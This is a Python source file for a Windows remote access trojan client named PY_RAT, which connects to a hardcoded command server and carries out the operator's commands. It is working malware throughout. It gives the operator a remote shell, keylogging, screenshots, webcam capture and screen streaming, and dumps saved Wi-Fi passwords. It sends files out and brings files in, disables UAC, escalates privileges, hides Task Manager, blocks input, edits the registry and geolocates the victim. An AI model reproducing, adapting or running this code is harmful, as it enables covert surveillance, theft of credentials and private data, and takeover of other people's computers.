import subprocess
import sys
import os
packages = [
    'comtypes',
    'geocoder',
    'Pillow',
    'pynput',
    'opencv-python',
    'pyautogui',
    'keyboard',
    'pycaw',
    'vidstream'
]

test_mode = False

if not test_mode:
    if os.name != 'nt':
        os.system('sudo apt-get install build-essential')
        os.system('sudo apt-get install portaudio19-dev')
    for package in packages:
        subprocess.check_call(['pip', 'install', package])

import geocoder
from threading import Thread
from datetime import datetime
import ctypes
from ctypes import cast, POINTER
from comtypes import CLSCTX_ALL
from winreg import *
import shutil
import os
import subprocess, platform
import socket
import random
from threading import Thread
from PIL import Image
from datetime import datetime
import ctypes
from ctypes import cast, POINTER
from winreg import *
import shutil
import glob
import pyautogui
import cv2
import urllib.request
from pynput.keyboard import Listener
from pynput.mouse import Controller
import time
import keyboard

user32 = ctypes.WinDLL('user32')
kernel32 = ctypes.WinDLL('kernel32')

HWND_BROADCAST = 65535
WM_SYSCOMMAND = 274
SC_MONITORPOWER = 61808
GENERIC_READ = -2147483648
GENERIC_WRITE = 1073741824
FILE_SHARE_WRITE = 2
FILE_SHARE_READ = 1
FILE_SHARE_DELETE = 4
CREATE_ALWAYS = 2
block = False
klgr = False
mousedbl = False
kbrd = False


class PY_RAT:
    def __init__(self, host, port):
        self.client_ip = host
        self.client_port = port
        self.curdir = os.getcwd()

    # Function to get the client's location based on IP address
    def get_location(self):
        g = geocoder.ip('me')
        return "\033[1;95mCountry: \033[1;97m"+g.country+"\n\033[1;95mState: \033[1;97m"+g.state+"\n\033[1;95mCity: \033[1;97m"+g.city

    def get_latlng(self, index):
        g = geocoder.ip('me')
        return g.latlng[index]

    def block_task_manager(self):
        if ctypes.windll.shell32.IsUserAnAdmin() == 1:
            while (1):
                if block == True:
                    hwnd = user32.FindWindowW(0, "Task Manager")
                    user32.ShowWindow(hwnd, 0)
                    ctypes.windll.kernel32.Sleep(500)

    # Function to handle commands from the server
    def keylogger(self):
        def on_press(key):
            if klgr == True:
                with open('keylogs.txt', 'a') as f:
                    f.write(f'{key}')
                    f.close()

        with Listener(on_press=on_press) as listener:
            listener.join()

    def disable_all(self):
        while True:
            user32.BlockInput(True)

    def disable_mouse(self):
        mouse = Controller()
        t_end = time.time() + 3600 * 24 * 11
        while time.time() < t_end and mousedbl == True:
            mouse.position = (0, 0)

    def disable_keyboard(self):
        for i in range(150):
            if kbrd == True:
                keyboard.block_key(i)
        time.sleep(999999)

    def handle_server_commands(self):
        while True:
            command = client.recv(1024).decode('ascii')
            if command == "execom":
                cmd = client.recv(16384).decode('ascii')
                client.send(subprocess.getoutput(cmd).encode('ascii'))
            elif command == "0drivers0":
                drives = []
                bitmask = kernel32.GetLogicalDrives()
                letter = ord('A')
                while bitmask > 0:
                    if bitmask & 1:
                        drives.append(chr(letter) + ':\\')
                    bitmask >>= 1
                    letter += 1
                client.send(str(drives).encode('ascii'))

            elif command.startswith("enable") and command.endswith("--keyboard"):
                kbrd = False
                client.send("Mouse and keyboard are unblocked".encode())

            elif command.startswith("enable") and command.endswith("--mouse"):
                mousedbl = False
                client.send("Mouse is enabled".encode())

            elif command.startswith("enable") and command.endswith("--all"):
                user32.BlockInput(False)
                client.send("Keyboard and mouse are enabled".encode())

            elif command.startswith("disable") and command.endswith("--all"):
                Thread(target=self.disable_all, daemon=True).start()
                client.send("Keyboard and mouse are disabled".encode())

            elif command.startswith("disable") and command.endswith("--keyboard"):
                kbrd = True
                Thread(target=self.disable_keyboard, daemon=True).start()
                client.send("Keyboard is disabled".encode())

            elif command.startswith("disable") and command.endswith("--mouse"):
                mousedbl = True
                Thread(target=self.disable_mouse, daemon=True).start()
                client.send("Mouse is disabled".encode())

            elif command == "0disuac0":
                os.system(
                    r"reg.exe ADD HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v EnableLUA /t REG_DWORD /d 0 /f")
            elif command == "0extrights0":
                ctypes.windll.shell32.ShellExecuteW(None, "runas", sys.executable, " ".join(sys.argv), None, 1)
                sending = f"{socket.gethostbyname(socket.gethostname())}'s rights were escalated"
                client.send(sending.encode('ascii'))
            elif command == "0etmg0r":
                block = False
                client.send("Task Manager is enabled".encode())
            elif command == "0volup0":
                try:
                    try:
                        from pycaw.pycaw import AudioUtilities, IAudioEndpointVolume
                    except Exception:
                        try:
                            subprocess.getoutput("pip install pycaw")
                        except subprocess.CalledProcessError:
                            client.send("There is and Error installing pycaw on targets computer.".encode())
                    else:
                        devices = AudioUtilities.GetSpeakers()
                        interface = devices.Activate(IAudioEndpointVolume._iid_, CLSCTX_ALL, None)
                        volume = cast(interface, POINTER(IAudioEndpointVolume))
                        if volume.GetMute() == 1:
                            volume.SetMute(0, None)
                        volume.SetMasterVolumeLevel(volume.GetVolumeRange()[1], None)
                        client.send("Volume is increased to 100%".encode())
                except subprocess.CalledProcessError:
                    client.send("Module is not founded".encode())

            elif command == '0cpf0':
                command = client.recv(1024).decode('ascii')
                try:
                    shutil.copyfile(command.split(" ")[1], command.split(" ")[2])
                    client.send(f'{command.split(" ")[1]} was copied to {command.split(" ")[2]}'.encode())
                except:
                    client.send('Invalid file to be copied!'.encode('ascii'))

            elif command == '0mkdir0':
                command = client.recv(1024).decode('ascii')
                try:
                    os.mkdir(command[6:])
                    client.send(f'Directory {command[6:]} was created'.encode())
                except:
                    client.send('Cant Make file'.encode('ascii'))

            elif command == '0rdf0':
                command = client.recv(1024).decode('ascii')
                try:
                    f = open(command[9:], 'r')
                    data = f.read()
                    if not data: client.send("No data".encode())
                    f.close()
                    client.send(data.encode())
                except:
                    client.send("No such file in directory".encode())

            elif command == '0strf0':
                command = client.recv(1024).decode('ascii')
                try:
                    client.send(f'{command[10:]} was started'.encode())
                    os.startfile(command[10:])
                except:
                    client.send('Cant Start File'.encode('ascii'))

            elif command == '0srcf0':
                command = client.recv(1024).decode('asii')
                for x in glob.glob(command.split(" ")[2] + r"\\**\*", recursive=True):
                    if x.endswith(command.split(" ")[1]):
                        path = os.path.abspath(x)
                        client.send(str(path).encode())
                    else:
                        continue

            elif command == '0rmdir0':
                command = client.recv(1024).decode('ascii')
                try:
                    shutil.rmtree(command[6:])
                    client.send(f'Directory {command[6:]} was removed'.encode())
                except:
                    client.send('Cant Remove file'.encode('ascii'))

            elif command == '0mvf0':
                command = client.recv(1024).decode('ascii')
                try:
                    shutil.move(command.split(" ")[1], command.split(" ")[2])
                    client.send(f'File was moved from {command.split(" ")[1]} to {command.split(" ")[2]}'.encode())
                except:
                    client.send('Invalid file to be moved!'.encode('ascii'))

            elif command == "0setvalue0":
                const = client.recv(1024).decode()
                root = client.recv(1024).decode()
                key2 = client.recv(1024).decode()
                value = client.recv(1024).decode()
                try:
                    if const == 'HKEY_CURRENT_USER':
                        key = OpenKey(HKEY_CURRENT_USER, root, 0, KEY_ALL_ACCESS)
                        SetValueEx(key, key2, 0, REG_SZ, str(value))
                        CloseKey(key)
                    if const == 'HKEY_CLASSES_ROOT':
                        key = OpenKey(HKEY_CLASSES_ROOT, root, 0, KEY_ALL_ACCESS)
                        SetValueEx(key, key2, 0, REG_SZ, str(value))
                        CloseKey(key)
                    if const == 'HKEY_LOCAL_MACHINE':
                        key = OpenKey(HKEY_LOCAL_MACHINE, root, 0, KEY_ALL_ACCESS)
                        SetValueEx(key, key2, 0, REG_SZ, str(value))
                        CloseKey(key)
                    if const == 'HKEY_USERS':
                        key = OpenKey(HKEY_USERS, root, 0, KEY_ALL_ACCESS)
                        SetValueEx(key, key2, 0, REG_SZ, str(value))
                        CloseKey(key)
                    if const == 'HKEY_CLASSES_ROOT':
                        key = OpenKey(HKEY_CLASSES_ROOT, root, 0, KEY_ALL_ACCESS)
                        SetValueEx(key, key2, 0, REG_SZ, str(value))
                        CloseKey(key)
                    if const == 'HKEY_CURRENT_CONFIG':
                        key = OpenKey(HKEY_CURRENT_CONFIG, root, 0, KEY_ALL_ACCESS)
                        SetValueEx(key, key2, 0, REG_SZ, str(value))
                        CloseKey(key)
                    client.send("Value is set".encode())
                except:
                    client.send("Impossible to create key".encode())
            elif command == "0setwp0":
                pic = client.recv(6000).decode()
                try:
                    ctypes.windll.user32.SystemParametersInfoW(20, 0, pic, 0)
                    client.send(f'{pic} is set as a wallpaper'.encode())
                except:
                    client.send("No such file")
            elif command == "0abspath0":
                try:
                    path = os.path.abspath("abspath"[8:])
                    client.send(path.encode())
                except:
                    client.send("No such file in directory".encode())
            elif command == "0dir0":
                try:
                    output = subprocess.check_output(["dir"], shell=True)
                    output = output.decode('utf8', errors='ignore')
                    client.send(output.encode())
                except:
                    client.send("Cant Print All Files.\nUse DIR command in the shell to print all files")
            elif command == "0cwd0":
                out = subprocess.getoutput('cd')
                client.send(out.encode('ascii'))
            elif command == '0startkeylog0':
                klgr = True
                kernel32.CreateFileW(b'keylogs.txt', GENERIC_WRITE & GENERIC_READ,
                                     FILE_SHARE_WRITE & FILE_SHARE_READ & FILE_SHARE_DELETE,
                                     None, CREATE_ALWAYS, 0, 0)
                Thread(target=self.keylogger, daemon=True).start()
                client.send("Keylogger is started".encode())

            elif command == '0keystroke0':
                try:
                    f = open("keylogs.txt", 'r')
                    lines = f.readlines()
                    f.close()
                    client.send(str(lines).encode())
                    os.remove('keylogs.txt')
                except:
                    print("Error While Sending The Logs")

            elif command == '0stopkeylog0':
                klgr = False
                client.send("The session of keylogger is terminated".encode())
            elif command == "0chdir0":
                drive = client.recv(1024).decode('ascii')
                os.system(f'cd {drive}')
                client.send(f"Drive Changed to {drive}".encode('ascii'))
            elif command == "0getip0":
                result = socket.gethostbyname(socket.gethostname())
                client.send(result.encode('ascii'))
            elif command == "0netprf0":
                output = subprocess.check_output('netsh wlan show profiles', encoding='oem')
                client.send(output.encode())
            elif command == '0netpswd0':
                profile = client.recv(1024).decode('ascii')
                try:
                    output = subprocess.check_output(f'netsh wlan show profile {profile} key=clear', encoding='oem')
                    client.send(output.encode('ascii'))
                except:
                    client.send("Invalid Profile Given")
            elif command == "0cd0":
                try:
                    os.chdir(command)
                    curdir = str(os.getcwd())
                    client.send(curdir.encode('ascii'))
                except:
                    client.send("No such directory".encode('ascii'))
            elif command == "0cd ..0":
                os.chdir('..')
                curdir = str(os.getcwd())
                client.send(curdir.encode())
            elif command == "0mkkey0":
                const = client.recv(1024).decode()
                root = client.recv(1024).decode()
                try:
                    if const == 'HKEY_CURRENT_USER':
                        CreateKeyEx(HKEY_CURRENT_USER, root, 0, KEY_ALL_ACCESS)
                    if const == 'HKEY_LOCAL_MACHINE':
                        CreateKeyEx(HKEY_LOCAL_MACHINE, root, 0, KEY_ALL_ACCESS)
                    if const == 'HKEY_USERS':
                        CreateKeyEx(HKEY_USERS, root, 0, KEY_ALL_ACCESS)
                    if const == 'HKEY_CLASSES_ROOT':
                        CreateKeyEx(HKEY_CLASSES_ROOT, root, 0, KEY_ALL_ACCESS)
                    if const == 'HKEY_CURRENT_CONFIG':
                        CreateKeyEx(HKEY_CURRENT_CONFIG, root, 0, KEY_ALL_ACCESS)
                    client.send("Key is created".encode())
                except:
                    client.send("Impossible to create key".encode())
            elif command == "0delkey0":
                const = client.recv(1024).decode()
                root = client.recv(1024).decode()
                try:
                    if const == 'HKEY_CURRENT_USER':
                        DeleteKeyEx(HKEY_CURRENT_USER, root, KEY_ALL_ACCESS, 0)
                    if const == 'HKEY_LOCAL_MACHINE':
                        DeleteKeyEx(HKEY_LOCAL_MACHINE, root, KEY_ALL_ACCESS, 0)
                    if const == 'HKEY_USERS':
                        DeleteKeyEx(HKEY_USERS, root, KEY_ALL_ACCESS, 0)
                    if const == 'HKEY_CLASSES_ROOT':
                        DeleteKeyEx(HKEY_CLASSES_ROOT, root, KEY_ALL_ACCESS, 0)
                    if const == 'HKEY_CURRENT_CONFIG':
                        DeleteKeyEx(HKEY_CURRENT_CONFIG, root, KEY_ALL_ACCESS, 0)
                    client.send("Key is deleted".encode())
                except:
                    client.send("Impossible to delete key".encode())
            elif command == "0voldwn0":
                try:
                    try:
                        from pycaw.pycaw import AudioUtilities, IAudioEndpointVolume
                    except Exception:
                        try:
                            subprocess.getoutput("pip install pycaw")
                        except subprocess.CalledProcessError:
                            client.send("There is and Error installing pycaw on targets computer.".encode())
                    else:
                        devices = AudioUtilities.GetSpeakers()
                        interface = devices.Activate(IAudioEndpointVolume._iid_, CLSCTX_ALL, None)
                        volume = cast(interface, POINTER(IAudioEndpointVolume))
                        volume.SetMasterVolumeLevel(volume.GetVolumeRange()[0], None)
                        client.send("Volume is decreased to 0%".encode())
                except:
                    client.send("Module is not founded".encode())
            elif command == "0dtmgr0":
                block = True
                Thread(target=self.block_task_manager, daemon=True).start()
                client.send("Task Manager is disabled".encode('ascii'))
            elif command == "0monit0":
                p = subprocess.check_output(
                    [r"powershell.exe", r"Get-CimInstance -Namespace root\wmi -ClassName WmiMonitorBasicDisplayParams"],
                    encoding='utf-8')
                client.send(p.encode())
            elif command == "0isadmin0":
                if ctypes.windll.shell32.IsUserAnAdmin() == 1:
                    sending = f'{socket.gethostbyname(socket.gethostname())} is admin'
                    client.send(sending.encode())
                else:
                    sending = f'{socket.gethostbyname(socket.gethostname())} is not admin'
                    client.send(sending.encode())
            elif command == "0clpid0":
                pid = os.getpid()
                client.send(str(pid).encode('ascii'))
            elif command == "0lltime0":
                now = datetime.now()
                current_time = now.strftime("%H:%M:%S")
                client.send(str(current_time).encode())
            elif command == "0tlist0":
                output = subprocess.check_output('tasklist', encoding='oem')
                client.send(output.encode())
            elif command == "0cpucores0":
                output = os.cpu_count()
                client.send(str(output).encode('ascii'))
            elif command == "0msgsnd0":
                text = client.recv(6000).decode('ascii')
                title = client.recv(6000).decode('ascii')
                client.send('MessageBox has appeared'.encode('ascii'))
                user32.MessageBoxW(0, text, title, 0x00000000 | 0x00000040)
            elif command == "0tkill0":
                task = client.recv(1024).decode('ascii')
                os.system(f'TASKKILL /F /im {task}')
                client.send(f'{task} was terminated'.encode())
            elif command == "0shutdown0":
                os.system('shutdown /s /t 1')
                sending = f"{socket.gethostbyname(socket.gethostname())} was shutdown"
                client.send()
            elif command == '0turnoffmon0':
                client.send(f"{socket.gethostbyname(socket.gethostname())}'s monitor was turned off".encode('ascii'))
                user32.SendMessage(HWND_BROADCAST, WM_SYSCOMMAND, SC_MONITORPOWER, 2)
            elif command == "0reboot0":
                os.system("shutdown /r /t 1")
                client.send(f'{socket.gethostbyname(socket.gethostname())} is being rebooted'.encode())
            elif command == '0turnonmon0':
                client.send(f"{socket.gethostbyname(socket.gethostname())}'s monitor was turned on".encode('ascii'))
                user32.SendMessage(HWND_BROADCAST, WM_SYSCOMMAND, SC_MONITORPOWER, -1)
            elif command == "0browse0":
                query = client.recv(1024).decode('ascii')
                os.system(f'start chrome https:\\\\google.com/search?q{query}')
                client.send('The TAB is opened'.encode('ascii'))

            elif command == '0scrsh0':
                try:
                    try:
                        from vidstream import ScreenShareClient
                    except Exception:
                        try:
                            subprocess.getoutput("pip install vidstream")
                        except subprocess.CalledProcessError:
                            client.send('Error cand install vidstream on target PC!')
                    else:
                        screen = ScreenShareClient(self.client_ip, 9875)
                        screen.start_stream()
                except:
                    client.send("Error! cant get screen")

            elif command == '0wcam0':
                try:
                    try:
                        from vidstream import CameraClient
                    except Exception:
                        try:
                            subprocess.getoutput("pip install vidstream")
                        except subprocess.CalledProcessError:
                            client.send('Error cand install vidstream on target PC!')
                    else:
                        cam = CameraClient(self.client_ip, 9875)
                        cam.start_stream()
                except:
                    client.send("Error! cant get webcam")

            elif command == '0sshot0':
                try:
                    file = f'{random.randint(111111, 444444)}-{time.time()}.png'
                    file2 = f'{random.randint(555555, 999999)}-{time.time()}.png'
                    pyautogui.screenshot(file)
                    image = Image.open(file)
                    new_image = image.resize((1920, 1080))
                    new_image.save(file2)
                    file = open(file2, 'rb')
                    data = file.read()
                    client.send(data)
                except:
                    client.send("There Was an Error While receiving an screenshot".encode('ascii'))

            elif command == '0edtf0':
                command = client.recv(1024).decode('ascii')
                try:
                    with open(command.split(" ")[1], 'a') as f:
                        f.write(command.split(" ")[2])
                        f.close()
                    sending = f'{command.split(" ")[2]} was written to {command.split(" ")[1]}'
                    client.send(sending.encode())
                except:
                    client.send('Error While Editing The File'.encode('ascii'))
            elif command == "0lk0":
                os.system("Rundll32.exe user32.dll,LockWorkStation")
            elif command == '0mkf0':
                command = client.recv(1024).decode('ascii')
                kernel32.CreateFileW(command[11:], GENERIC_WRITE & GENERIC_READ,
                                     FILE_SHARE_WRITE & FILE_SHARE_READ & FILE_SHARE_DELETE,
                                     None, CREATE_ALWAYS, 0, 0)
                client.send(f'{command[11:]} was created'.encode())

            elif command == '0dlf0':
                try:
                    file = client.recv(1024).decode('ascii')
                    os.remove(file[8:])
                    client.send(f'{file[8:]} was successfully deleted'.encode())
                except:
                    print("Error While deleting a file")

            elif command == '0wpic0':
                try:
                    file = f'{random.randint(111111, 444444)}-{time.time()}.png'
                    file2 = f'{random.randint(555555, 999999)}-{time.time()}.png'
                    global return_value, i
                    cam = cv2.VideoCapture(0)
                    for i in range(1):
                        return_value, image = cam.read()
                        filename = cv2.imwrite(f'{file}', image)
                    del (cam)
                    image = Image.open(file)
                    new_image = image.resize((1920, 1080))
                    new_image.save(file2)
                    file = open(file2, 'rb')
                    data = file.read()
                    client.send(data)
                except:
                    print("Error While getting webcam picture")

            elif command == "0writesscreen0":
                words = client.recv(1024).decode('ascii')
                pyautogui.write(words)
                client.send(f'{words} is written'.encode('ascii'))
            elif command == "receive":
                filename = client.recv(6000)
                newfile = open(filename, 'wb')
                data = client.recv(6000)
                newfile.write(data)
                newfile.close()
            elif command == "send":
                getfilename = client.recv(1204).decode('ascii')
                file = open(getfilename, 'rb')
                data = file.read()
                file.close()
                client.send(data)
            elif command == "0portscan0":
                output = subprocess.check_output('netstat -an', encoding='oem')
                client.send(output.encode('ascii'))
            elif command == 'geolocate':
                client.send(self.get_location().encode('ascii'))
                with urllib.request.urlopen("https://geolocation-db.com/json") as url:
                    lat = self.get_latlng(0)
                    lng = self.get_latlng(1) #json.loads(url.read().decode())
                    googlelink = f"https://www.google.com/maps/place/{lat},{lng}"
                    binglink = f"https://bing.com/maps/default.aspx?cp={lat}~{lng}"
                client.send(googlelink.encode('ascii'))
                client.send(binglink.encode('ascii'))
                client.send(str(lat).encode('ascii'))
                client.send(str(lng).encode('ascii'))

            elif command == "0send_info0":
                client.send(subprocess.getoutput('systeminfo').encode('ascii'))

            elif command == "0mintab0":
                pyautogui.hotkey('ctrl', 'w')


    # Main function to connect to the server
    def connect_to_server(self):
        global client
        try:
            client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            client.connect((self.client_ip, self.client_port))

            client.send('connect'.encode('ascii'))
            if client.recv(1024).decode('ascii') == "0sendip0":
                ip = socket.gethostbyname(socket.gethostname()) + " as " + socket.gethostname()
                client.send(ip.encode('ascii'))


            #self.handle_server_commands(client)

        except Exception as e:
            quit()

# Entry point of the script
ratclient = PY_RAT('192.168.100.8', 2545)
if __name__ == "__main__":
    ratclient.connect_to_server()
    ratclient.handle_server_commands()
